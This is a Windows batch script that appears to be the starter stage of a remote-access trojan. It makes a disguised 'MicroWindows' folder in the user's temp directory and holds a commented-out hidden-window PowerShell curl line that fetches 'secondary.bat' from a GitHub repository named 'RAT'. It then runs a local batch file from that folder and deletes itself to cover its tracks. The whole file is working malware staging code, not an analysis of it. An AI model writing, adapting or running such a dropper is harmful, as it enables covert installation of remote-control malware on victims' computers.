mkdir C:\Users\%username%\AppData\Local\Temp\MicroWindows
@rem powershell powershell.exe -windowstyle hidden curl https://raw.githubusercontent.com/saifnasef/RAT/main/secondary.bat -o C:/Users/%username%/AppData/Local/Temp/MicroWindows/secondary.bat
timeout 5

cd C:\Users\%username%\AppData\Local\Temp\MicroWindows
hello.bat
cd %currentd%
del Starter.bat